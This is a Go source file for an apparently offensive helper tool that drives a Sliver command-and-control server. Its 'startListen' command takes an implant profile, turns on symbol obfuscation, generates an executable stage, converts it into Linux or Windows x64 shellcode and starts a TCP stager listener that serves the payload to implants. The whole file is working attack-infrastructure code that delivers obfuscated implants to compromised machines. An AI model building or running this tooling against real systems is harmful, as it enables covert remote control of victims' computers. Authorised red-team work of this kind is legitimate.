package starListen

import (
	ctx "context"
	"encoding/json"
	"net/url"
	"os"
	"strconv"
	"time"

	c "github.com/Esonhugh/sliver-stage-helper/cmd/sliverStager/cmd"
	"github.com/Esonhugh/sliver-stage-helper/pkg/shellcoder"
	"github.com/Esonhugh/sliver-stage-helper/pkg/sliverClient/protobuf/clientpb"
	"github.com/sirupsen/logrus"
	"github.com/spf13/cobra"
	"golang.org/x/net/context"
)

func init() {
	StartListenCmd.Flags().StringVarP(&Opt.ListenUrl, "listenUrl", "l", "", "listen url")
	StartListenCmd.Flags().StringVarP(&Opt.BeaconProfile, "profile", "p", "default", "beacon profile")
	StartListenCmd.Flags().StringVarP(&Opt.RawBytesFromFile, "rawBytesFromFile", "r", "", "raw bytes from file")
	StartListenCmd.Flags().StringVarP(&Opt.StageName, "stageName", "s", "helper-built-stager", "stage name")
	c.RootCmd.AddCommand(StartListenCmd)
}

var log = logrus.WithField("cmd", "startListen")

var Opt = struct {
	ListenUrl        string
	BeaconProfile    string
	RawBytesFromFile string
	StageName        string

	schema string
	host   string
	port   uint32
}{}

func toJson(v interface{}) string {
	s, _ := json.MarshalIndent(v, "", "  ")
	return string(s)
}

var StartListenCmd = &cobra.Command{
	Use:   "startListen",
	Short: "startListen",
	Long:  "startListen",
	PreRun: func(cmd *cobra.Command, args []string) {
		if Opt.ListenUrl == "" {
			log.Fatal("listen url is required")
			return
		}
		u, err := url.Parse(Opt.ListenUrl)
		if err != nil {
			log.Fatalf("invalid listener URL: %v", err)
		}
		Opt.schema = u.Scheme
		Opt.host = u.Hostname()
		if u.Port() == "" {
			switch u.Scheme {
			case "tcp":
				Opt.port = 4444
			case "http":
				Opt.port = 80
			case "https":
				Opt.port = 443
			}
		} else {
			port, _ := strconv.Atoi(u.Port())
			Opt.port = uint32(port)
		}
	},
	Run: func(cmd *cobra.Command, args []string) {

		var data []byte
		in := &clientpb.StagerListenerReq{
			Host: Opt.host,
			Port: Opt.port,
		}

		if Opt.RawBytesFromFile != "" {
			var err error
			data, err = os.ReadFile(Opt.RawBytesFromFile)
			if err != nil {
				log.Fatalf("read file %s failed: %v", Opt.RawBytesFromFile, err)
				return
			}
		} else if Opt.BeaconProfile != "" {
			log.Infof("Try to get implant profile %s", Opt.BeaconProfile)
			profile := c.Client.GetImplantProfileByName(Opt.BeaconProfile)
			if profile == nil {
				log.Fatalf("profile %s not found", Opt.BeaconProfile)
				return
			}
			log.Debugf("Got implant profile %s, config: %v", Opt.BeaconProfile, toJson(profile))
			log.Infof("Start generate a new profile")

			profile.Config.Format = clientpb.OutputFormat_EXECUTABLE
			profile.Config.ObfuscateSymbols = true

			profile, err := c.Client.SaveImplantProfile(ctx.Background(), profile)
			if err != nil {
				log.Fatalf("save stager implant profile failed: %v", err)
				return
			}
			log.Infof("Saved implant profile %s", profile.Name)

			start := time.Now()
			log.Infof("start generating executeable at %v", start.Format("2006-01-02 15:04:05"))
			log.Debugf("current profile config: \n%v", toJson(profile))
			/*
				gen, err := c.Client.Generate(context.Background(), &clientpb.GenerateReq{
					Name:   profile.Name,
					Config: profile.Config,
				})
			*/
			gen, err := c.Client.GenerateStage(context.Background(), &clientpb.GenerateStageReq{
				Profile:       profile.Name,
				Name:          "",
				AESEncryptKey: "",
				AESEncryptIv:  "",
				RC4EncryptKey: "",
				PrependSize:   false,
				Compress:      "none",
			})
			if err != nil {
				log.Fatalf("generate stage failed: %v", err)
				return
			}
			data = gen.File.Data

			if profile.Config.GOARCH != "amd64" {
				log.Fatalf("unsupported architecture: %s", profile.Config.GOARCH)
			}

			switch profile.Config.GOOS {
			case "linux":
				in.Data, err = shellcoder.GenerateLinuxX64ShellcodeFromBytes(data)
			case "windows":
				data, err = shellcoder.GenerateWindowsX64ShellcodeFromBytes(data)
				in.Data = data
			default:
				log.Fatalf("unsupported OS: %s", profile.Config.GOOS)
				return
			}
			if err != nil {
				log.Fatalf("generate shellcode failed: %v", err)
				return
			}
		} else {
			log.Fatalf("Both RawBytesFromFile and BeaconProfile are empty")
			return
		}

		var err error
		switch Opt.schema {
		case "tcp":
			if err != nil {
				log.Fatalf("generate shellcode failed: %v", err)
				return
			}
			lns, err := c.Client.StartTCPStagerListener(ctx.Background(), in)
			if err != nil {
				log.Fatalf("start listener failed: %v", err)
				return
			}
			log.Infof("listener started at Job %v", lns.JobID)
		default:
			log.Fatalf("invalid listener URL scheme: %s", Opt.schema)
			return
		}

	},
}
